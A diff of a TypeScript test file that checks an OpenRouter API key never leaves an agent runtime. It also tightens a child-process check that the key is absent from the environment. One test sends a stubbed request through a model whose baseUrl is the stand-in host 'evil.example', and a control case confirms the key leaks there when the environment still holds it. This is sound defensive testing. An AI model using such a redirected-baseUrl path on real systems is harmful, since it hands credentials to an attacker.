@@ -4,7 +4,7 @@
 // openrouter entry in models.json/auth.json. Every entry path goes through the
 // factory, so every entry path gets it. No network.
 import { afterEach, beforeEach, describe, expect, it } from "bun:test";
-import { execFileSync } from "node:child_process";
+import { execFileSync, spawnSync } from "node:child_process";
 import {
   chmodSync,
   existsSync,
@@ -847,7 +847,7 @@ describe("openrouter round 6 — the key never enters pi; the transport owns it"
     }
   });
 
-  it("(t3) no pi surface holds the key: auth yields the placeholder, and the key is in NO serialized pi object", async () => {
+  it("(t3) pi's auth, registered provider config and model data hold the placeholder, never the key", async () => {
     scaffold("or6t3");
     process.env.OPENROUTER_API_KEY = KEY;
     const spy = spyRegisterProviderCapture();
@@ -946,7 +946,7 @@ describe("openrouter round 6 — the key never enters pi; the transport owns it"
   });
 });
 
-// ── round 7: key out of the environment; refresh fails closed; canonical URL ──
+// ── rounds 7-8: key out of the environment; canonical URL; the refresh fallback has no key ──
 
 describe("openrouter round 7 — the key leaves the environment; refresh cannot leak it", () => {
   let agentsRoot: string;
@@ -1024,16 +1024,15 @@ describe("openrouter round 7 — the key leaves the environment; refresh cannot 
       await runAgent({ name: "or7r2", prompt: "say hi", agentsRoot, log: () => {} });
       expect(process.env.OPENROUTER_API_KEY).toBeUndefined(); // assertion A: gone from the environment
       // A REAL child process, spawned with THIS process's env, cannot see the key.
-      let out = "";
-      try {
-        out = execFileSync("printenv", ["OPENROUTER_API_KEY"], {
-          env: process.env,
-          encoding: "utf8",
-        });
-      } catch {
-        out = ""; // printenv exits non-zero when the variable is unset
-      }
-      expect(out).toBe(""); // assertion B: the child saw no key
+      // printenv exits 1 (and prints nothing) exactly when the variable is unset; a
+      // missing binary or any other failure is NOT accepted as "no key".
+      const child = spawnSync("printenv", ["OPENROUTER_API_KEY"], {
+        env: process.env,
+        encoding: "utf8",
+      });
+      expect(child.error).toBeUndefined(); // the child really ran
+      expect(child.status).toBe(1); // assertion B: unset in the child
+      expect(child.stdout).toBe(""); // and it printed nothing
     } finally {
       stub.restore();
     }
@@ -1107,6 +1106,10 @@ describe("openrouter round 7 — the key leaves the environment; refresh cannot 
       const rt = spy.instance;
       expect(rt, "the factory ran on a ModelRuntime").toBeDefined();
 
+      // A structurally valid openrouter model, taken BEFORE the refresh (after it,
+      // pi's built-in provider does not list bob's model id).
+      const bobModel = rt!.getModel("openrouter", MODEL);
+      expect(bobModel, "bob's openrouter model resolves before refresh").toBeDefined();
       const modelsPath = join(config.piAgentDir, "models.json");
       const models = JSON.parse(readFileSync(modelsPath, "utf8"));
       models.providers = { openrouter: { oauth: "radius" } }; // NO baseUrl
@@ -1117,21 +1120,37 @@ describe("openrouter round 7 — the key leaves the environment; refresh cannot 
       const auth = await rt!.getAuth("openrouter").catch(() => undefined);
       expect(auth?.auth?.apiKey ?? null).not.toBe(KEY); // assertion A
 
-      // 2) a request on a model with an evil baseUrl.
-      const model = rt!.getModel("openrouter", MODEL);
+      // 2) a request on a model with an evil baseUrl, through pi's REAL request path
+      // (ModelRuntime.streamSimple → prepareRequest → getAuth → the effective provider).
       const evil = {
-        ...(model ?? {}),
+        ...(bobModel as object),
         baseUrl: "https://evil.example/api/v1",
         api: "openai-completions",
       };
-      const stream = rt!
-        .getProvider("openrouter")
-        ?.streamSimple(evil as never, CTX as never, {} as never);
-      await stream?.result?.().catch(() => undefined);
-      // The stub saw NO request carrying the real key.
-      expect(stub.seen.filter((s) => String(s.auth).includes(KEY))).toEqual([]); // assertion B
-      // And if ANY request went out at all, its Authorization is not the key.
-      expect(stub.seen.every((s) => s.auth !== `Bearer ${KEY}`)).toBe(true); // assertion C
+      const attempt = async () => {
+        await rt!
+          .streamSimple(evil as never, CTX as never, {} as never)
+          .result()
+          .catch(() => undefined);
+      };
+      await attempt();
+      // assertion B: with the key contained, NO request carries it.
+      expect(stub.seen.filter((s) => String(s.auth).includes(KEY))).toEqual([]);
+
+      // CONTROL: the same path DOES carry the key to the evil host when the
+      // environment still holds it. This proves the fallback is effective and that
+      // assertion B could fail.
+      process.env.OPENROUTER_API_KEY = KEY;
+      try {
+        await attempt();
+      } finally {
+        delete process.env.OPENROUTER_API_KEY;
+      }
+      expect(
+        stub.seen.some(
+          (s) => s.url.startsWith("https://evil.example/") && s.auth === `Bearer ${KEY}`,
+        ),
+      ).toBe(true); // assertion C
     } finally {
       stub.restore();
       spy.restore();
